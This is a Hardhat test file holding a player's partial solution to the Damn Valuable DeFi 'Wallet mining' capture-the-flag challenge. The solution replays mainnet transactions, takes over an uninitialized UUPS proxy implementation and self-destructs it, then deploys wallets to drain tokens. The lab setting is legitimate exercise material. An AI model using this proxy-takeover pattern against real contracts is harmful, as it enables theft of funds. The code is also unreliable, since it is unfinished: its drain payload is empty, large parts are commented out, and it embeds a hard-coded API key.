const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801'; // has 20M DVT tokens and no code and assinged to a ward
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n; // 20M DVT tokens
    
    // we need to drain both walletDeployer and DEPOSIT_ADDRESS

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43); // 43 DVT tokens, 1 DVT token per wallet deployed
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const provider = new ethers.providers.InfuraProvider("mainnet", "8d7e1ccb994f44b2ac14432b6a308f9c"); // TODO: use env for infura key
        // the address that deployed the fact contract
        const factDeployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        // the tx hashes of the fact contract deployments
        const factTxHashes = [
            "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3",
            "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4",
            "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261"
        ];

        // send funds to the fact deployer
        await player.sendTransaction({
            to: factDeployer,
            value: ethers.utils.parseEther("100")
        });

        // replay the transactions for deploying the fact contract and the copy contract
        for (const txHash of factTxHashes) {
            // get the transaction from the mainnet provider
            let tx = await provider.getTransaction(txHash);
            // the unsigned transaction
            const unsignedTx = {
                to: tx.to,
                nonce: tx.nonce,
                gasLimit: tx.gasLimit,
                gasPrice: tx.gasPrice,
                data: tx.data,
                value: tx.value,
                chainId: tx.chainId
            };
            // the signature of the transaction
            const signature = {
                v: tx.v,
                r: tx.r,
                s: tx.s
            }

            // serialize the transaction
            const serializedTx = ethers.utils.serializeTransaction(unsignedTx, signature);
            // replay the serialized transaction on the hardhat network
            await ethers.provider.send("eth_sendRawTransaction", [serializedTx]);
        }

        // the factory contract now has code

        // upgrade the authorizer to the exploit contract and call selfDestruct to destroy the authorizer implementation
        const authorizerImplSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        const authorizerImplAddress = `0x${(await ethers.provider.getStorageAt(authorizer.address, authorizerImplSlot)).substring(26)}`;
        const authorizerImpl = await ethers.getContractAt("AuthorizerUpgradeable", authorizerImplAddress);
        await authorizerImpl.connect(player).init([], []);
        const authorizerExploit = await (await ethers.getContractFactory("AuthorizerExploit")).deploy();
        await authorizerImpl.connect(player).upgradeToAndCall(authorizerExploit.address, authorizerExploit.interface.encodeFunctionData("selfDestruct", []));

        // all calls to `can(u, a)` will now return true for any u and a

        // deploy all safes prior to the deposit safe
        for (let i = 0; i < 42; i++) {
            // no initialization data is needed
            await walletDeployer.connect(player).drop("0x");
        }

        // the initalization data should drain the deposit address and send the funds to the player
        const data = "0x";

        // deploy the safe of the deposit address and drain the funds to the player
        await walletDeployer.connect(player).drop(data);

        // const wallet = await (await ethers.getContractFactory("GnosisSafe")).attach(DEPOSIT_ADDRESS);

        // await wallet.connect(player).setup(
        //     [player.address], // owners
        //     1, // threshold
        //     ethers.constants.AddressZero, // to
        //     "0x", // data
        //     ethers.constants.AddressZero, // fallbackHandler
        //     ethers.constants.AddressZero, // paymentToken
        //     0, // payment
        //     ethers.constants.AddressZero // paymentReceiver
        // );


        // the initalization data should drain the deposit address and send the funds to the player
        // // function execTransaction(
        // //     address to,
        // //     uint256 value,
        // //     bytes calldata data,
        // //     Enum.Operation operation,
        // //     uint256 safeTxGas,
        // //     uint256 baseGas,
        // //     uint256 gasPrice,
        // //     address gasToken,
        // //     address payable refundReceiver,
        // //     bytes calldata signatures
        // // )
        // // const execSignature = 
        // // const validator = await (await ethers.getContractFactory("Validator", player)).deploy();

        // const execData = exploit.interface.encodeFunctionData("drainWallet", [token.address, player.address, DEPOSIT_TOKEN_AMOUNT])
        // // eth_sign
        // const execSignature = await player.signMessage(ethers.utils.arrayify(execData));

        // const signerAddress = ethers.utils.verifyMessage(execData, execSignature);
        // console.log(signerAddress, player.address, await wallet.getOwners());

        // // // forge a contract signature
        // // const signature = "0x"
        // //     + validator.address.substring(2).padStart(64, "0") // r: bytes32(validator address)
        // //     + "0000000000000000000000000000000000000000000000000000000000000041" // s: bytes32(65)
        // //     + "00" // v: 0
        // //     + "0000000000000000000000000000000000000000000000000000000000000000"; // contractSignature: bytes32(0)

        // await wallet.connect(player).execTransaction(
        //     exploit.address, // to
        //     0, // value
        //     execData, // data
        //     0, // operation
        //     0, // safeTxGas
        //     0, // baseGas
        //     0, // gasPrice
        //     ethers.constants.AddressZero, // gasToken
        //     ethers.constants.AddressZero, // refundReceiver
        //     execSignature // signatures
        // );

        // replay the transaction for 
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        // expect(
        //     await token.balanceOf(DEPOSIT_ADDRESS)
        // ).to.eq(0);
        // expect(
        //     await token.balanceOf(walletDeployer.address)
        // ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
